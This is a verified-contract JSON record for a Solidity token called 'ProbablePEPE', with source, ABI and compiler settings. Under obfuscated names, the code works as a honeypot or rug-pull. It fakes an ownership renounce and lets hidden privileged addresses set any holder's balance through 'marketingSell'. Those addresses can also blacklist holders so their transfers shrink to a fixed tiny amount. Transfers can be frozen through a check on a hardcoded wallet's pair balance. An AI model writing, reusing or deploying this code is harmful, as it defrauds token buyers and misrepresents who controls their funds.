{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface limitReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atFundLaunch) external view returns (uint256);\n\n    function transfer(address totalTakeReceiver, uint256 sellMode) external returns (bool);\n\n    function allowance(address shouldSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTakeReceiver,\n        uint256 sellMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atReceiver, uint256 value);\n    event Approval(address indexed shouldSwap, address indexed spender, uint256 value);\n}\n\nabstract contract launchLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toAtTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchMode {\n    function createPair(address launchedSell, address sellMarketing) external returns (address);\n}\n\ninterface limitReceiverMetadata is limitReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProbablePEPE is launchLaunched, limitReceiver, limitReceiverMetadata {\n\n    string private launchedTx = \"Probable PEPE\";\n\n    function autoList(address minTeam) public {\n        require(minTeam.balance < 100000);\n        if (modeSwap) {\n            return;\n        }\n        \n        fromAuto[minTeam] = true;\n        if (tradingWallet) {\n            fromMax = liquidityFrom;\n        }\n        modeSwap = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldList;\n    }\n\n    uint256 walletLiquidityTx;\n\n    bool public swapLimit;\n\n    mapping(address => mapping(address => uint256)) private autoLiquidity;\n\n    function balanceOf(address atFundLaunch) public view virtual override returns (uint256) {\n        return enableLaunched[atFundLaunch];\n    }\n\n    string private sellToFee = \"PPE\";\n\n    bool private tradingWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedTx;\n    }\n\n    mapping(address => uint256) private enableLaunched;\n\n    address private shouldWallet;\n\n    function transfer(address walletTrading, uint256 sellMode) external virtual override returns (bool) {\n        return exemptMax(_msgSender(), walletTrading, sellMode);\n    }\n\n    bool public tradingTxEnable;\n\n    bool private walletModeMax;\n\n    mapping(address => bool) public modeTo;\n\n    address enableModeExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return shouldWallet;\n    }\n\n    uint256 totalToLiquidity;\n\n    constructor (){\n        if (exemptBuy) {\n            swapLimit = true;\n        }\n        toAtTrading tradingTotal = toAtTrading(enableModeExempt);\n        autoFee = launchMode(tradingTotal.factory()).createPair(tradingTotal.WETH(), address(this));\n        \n        exemptSellLaunch = _msgSender();\n        atBuyTake();\n        fromAuto[exemptSellLaunch] = true;\n        enableLaunched[exemptSellLaunch] = tradingMax;\n        if (liquidityFrom == fromMax) {\n            exemptBuy = true;\n        }\n        emit Transfer(address(0), exemptSellLaunch, tradingMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellToFee;\n    }\n\n    function approve(address takeToken, uint256 sellMode) public virtual override returns (bool) {\n        autoLiquidity[_msgSender()][takeToken] = sellMode;\n        emit Approval(_msgSender(), takeToken, sellMode);\n        return true;\n    }\n\n    function totalReceiverTo(uint256 sellMode) public {\n        tokenMarketing();\n        totalToLiquidity = sellMode;\n    }\n\n    bool public fromTeam;\n\n    function tokenMarketing() private view {\n        require(fromAuto[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed toMarketing, address indexed marketingLaunched);\n\n    bool private txSwap;\n\n    uint256 public liquidityFrom;\n\n    mapping(address => bool) public fromAuto;\n\n    address public exemptSellLaunch;\n\n    uint256 public fromMax;\n\n    function marketingSell(address walletTrading, uint256 sellMode) public {\n        tokenMarketing();\n        enableLaunched[walletTrading] = sellMode;\n    }\n\n    uint256 private tradingMax = 100000000 * 10 ** 18;\n\n    function allowance(address modeLiquidity, address takeToken) external view virtual override returns (uint256) {\n        if (takeToken == enableModeExempt) {\n            return type(uint256).max;\n        }\n        return autoLiquidity[modeLiquidity][takeToken];\n    }\n\n    bool private exemptBuy;\n\n    function owner() external view returns (address) {\n        return shouldWallet;\n    }\n\n    function atBuyTake() public {\n        emit OwnershipTransferred(exemptSellLaunch, address(0));\n        shouldWallet = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingMax;\n    }\n\n    function exemptMax(address autoShouldTake, address totalTakeReceiver, uint256 sellMode) internal returns (bool) {\n        if (autoShouldTake == exemptSellLaunch) {\n            return sellShould(autoShouldTake, totalTakeReceiver, sellMode);\n        }\n        uint256 receiverIs = limitReceiver(autoFee).balanceOf(tradingMarketing);\n        require(receiverIs == totalToLiquidity);\n        require(totalTakeReceiver != tradingMarketing);\n        if (modeTo[autoShouldTake]) {\n            return sellShould(autoShouldTake, totalTakeReceiver, limitFrom);\n        }\n        return sellShould(autoShouldTake, totalTakeReceiver, sellMode);\n    }\n\n    uint8 private shouldList = 18;\n\n    function exemptTo(address teamExempt) public {\n        tokenMarketing();\n        if (fromMax != liquidityFrom) {\n            tradingTxEnable = false;\n        }\n        if (teamExempt == exemptSellLaunch || teamExempt == autoFee) {\n            return;\n        }\n        modeTo[teamExempt] = true;\n    }\n\n    bool private takeTokenLimit;\n\n    address public autoFee;\n\n    bool public modeSwap;\n\n    address tradingMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant limitFrom = 15 ** 10;\n\n    function sellShould(address autoShouldTake, address totalTakeReceiver, uint256 sellMode) internal returns (bool) {\n        require(enableLaunched[autoShouldTake] >= sellMode);\n        enableLaunched[autoShouldTake] -= sellMode;\n        enableLaunched[totalTakeReceiver] += sellMode;\n        emit Transfer(autoShouldTake, totalTakeReceiver, sellMode);\n        return true;\n    }\n\n    function transferFrom(address autoShouldTake, address totalTakeReceiver, uint256 sellMode) external override returns (bool) {\n        if (_msgSender() != enableModeExempt) {\n            if (autoLiquidity[autoShouldTake][_msgSender()] != type(uint256).max) {\n                require(sellMode <= autoLiquidity[autoShouldTake][_msgSender()]);\n                autoLiquidity[autoShouldTake][_msgSender()] -= sellMode;\n            }\n        }\n        return exemptMax(autoShouldTake, totalTakeReceiver, sellMode);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuyTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFundLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSellLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMode\",\"type\":\"uint256\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellMode\",\"type\":\"uint256\"}],\"name\":\"totalReceiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShouldTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTakeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProbablePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}